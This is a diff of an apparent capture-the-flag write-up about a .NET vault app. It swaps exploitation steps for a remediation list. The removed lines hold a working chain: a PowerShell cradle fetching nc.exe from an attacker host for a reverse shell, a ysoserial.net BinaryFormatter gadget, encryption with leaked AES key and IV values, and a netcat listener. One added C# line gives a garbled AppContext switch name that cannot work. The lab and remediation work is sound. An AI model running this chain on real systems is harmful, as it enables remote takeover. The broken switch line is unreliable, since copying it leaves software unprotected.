@@ -1,122 +1,94 @@
-1. **Prepare the PowerShell download cradle**
+## Patching and Remediation
+
+1. **Remove BinaryFormatter entirely**
     
-      
+    BinaryFormatter is obsolete and unsafe. The simplest fix is to stop serializing the password at all. Passwords should be stored as plain UTF-8 strings and encrypted directly:
     
-    The pentester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:
-    
-      
-    
-    Bash
+    C#
     
     ```
-    echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' | iconv -t UTF-16LE | base64 -w0
+    public static string EncryptPassword(string password)
+    {
+        byte[] plaintext = Encoding.UTF8.GetBytes(password);
+        byte[] ciphertext;
+    
+        using (ICryptoTransform encryptor = GetAES().CreateEncryptor())
+            ciphertext = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
+    
+        return Convert.ToBase64String(ciphertext);
+    }
+    
+    public static string DecryptPassword(string b64)
+    {
+        try
+        {
+            byte[] ciphertext = Convert.FromBase64String(b64);
+            byte[] plaintext;
+    
+            using (ICryptoTransform decryptor = GetAES().CreateDecryptor())
+                plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
+    
+            return Encoding.UTF8.GetString(plaintext);
+        }
+        catch (Exception)
+        {
+            return "[!] ERROR: Corrupted Password";
+        }
+    }
     ```
     
-    This produces a UTF-16LE base64-encoded PowerShell payload.
+    If the current database already contains BinaryFormatter-serialized entries, write a one-time migration that decrypts, deserializes in a fully trusted offline process, re-encrypts as plain strings, and updates the records.
     
-      
+2. **If serialization is truly required, use a safe serializer**
     
-2. **Generate the .NET deserialization gadget**
+    Replace BinaryFormatter with `System.Text.Json` or `Newtonsoft.Json` with `TypeNameHandling.None`. Never enable type-name handling unless a strict `SerializationBinder` whitelist is in place.
     
-      
+3. **Authenticate encrypted values (Encrypt-then-MAC)**
     
-    Using `ysoserial.net`, the pentester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:
+    Encryption alone does not protect integrity. Use an HMAC (e.g., `HMACSHA256` with a separate key) over the ciphertext and verify it before decryption. This prevents an attacker from forging ciphertext even if the encryption key is compromised.
     
-      
-    
-    PowerShell
+    C#
     
     ```
-    .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -nop -enc <payload_b64>"
+    byte[] ComputeHmac(byte[] data)
+    {
+        using (var hmac = new HMACSHA256(hmacKey))
+            return hmac.ComputeHash(data);
+    }
     ```
     
-    The output is a raw binary serialized object that, when deserialized by `BinaryFormatter`, will execute the supplied PowerShell command.
+4. **Validate imported encrypted passwords**
     
-      
+    Do not allow the `ImportPassword` endpoint to accept arbitrary encrypted blobs without verification. After decrypting, validate that the result is a legitimate password string (length, character set) before storing it.
     
-3. **Encrypt the payload with the leaked AES key**
+5. **Remove or restrict the ImportPassword feature**
     
-      
+    If the feature is not required, delete the `ImportPassword` action entirely. If it is required, require re-authentication, log every import, and restrict it to administrators.
     
-    Because the application decrypts the stored value with AES before passing it to `BinaryFormatter.Deserialize`, the raw binary payload must be encrypted using the same key and IV exposed in `Web.config`:
+6. **Rotate cryptographic keys**
     
-      
+    Because the `PasswordKey`, `PasswordIV`, and `AuthKey` were exposed, generate new keys immediately. Re-encrypt all stored passwords with the new keys and invalidate all existing sessions/cookies.
     
-    XML
+7. **Run the application pool under a low-privilege account**
     
-    ```
-    <add key="PasswordKey" value="f3d9aa53-c08d-43" />
-    <add key="PasswordIV" value="5ac8083e-8ff6-43" />
-    ```
+    Configure IIS to run the application pool as a dedicated, low-privilege service account with no administrative rights. This limits the damage if RCE is achieved.
     
-    The pentester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:
+8. **Enable deserialization mitigations**
     
-      
+    If migration away from BinaryFormatter is not immediately possible, set an AppContext switch to block dangerous types and configure a strict `SerializationBinder` that whitelists only `byte[]`:
     
-    Bash
+    C#
     
     ```
-    python vault.royalflush.htb-Deserialization-Payload.py payload.b64
+    AppContext.SetSwitch("Switch.System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.A deserialization vulnerability", true);
     ```
     
-    The script produced the final base64 ciphertext that the vault application could decrypt successfully.
+    However, this is only a temporary defense; complete removal is strongly recommended.
     
-      
+9. **Patch and update dependencies**
     
-4. **Start the listener**
+    Ensure all .NET libraries and NuGet packages are up to date so that known gadget chains in common libraries are eliminated.
     
-      
+10. **Monitor for exploitation**
     
-    On the attacker machine, the pentester started a netcat listener to catch the reverse shell:
-    
-      
-    
-    Bash
-    
-    ```
-    nc -lvnp <shell-port>
-    ```
-    
-    A simple HTTP server was also started to serve `nc.exe`:
-    
-      
-    
-    Bash
-    
-    ```
-    python3 -m http.server <port>
-    ```
-    
-5. **Submit the encrypted payload**
-    
-      
-    
-    The pentester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.
-    
-      
-    
-6. **Trigger deserialization and gain RCE**
-    
-      
-    
-    The pentester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.
-    
-      
-    
-7. **Shell access and flag retrieval**
-    
-      
-    
-    The reverse shell connected, giving the pentester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:
-    
-      
-    
-    DOS
-    
-    ```
-    C:\> dir C:\
-    ...
-    ddf1df82dea9ce0d6ab3a03aa80cbdac
-    ```
-    
-    The pentester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.
+    Log and alert on unusual process creation from the IIS worker process, such as `powershell.exe`, `cmd.exe`, or network connections to unexpected external addresses.
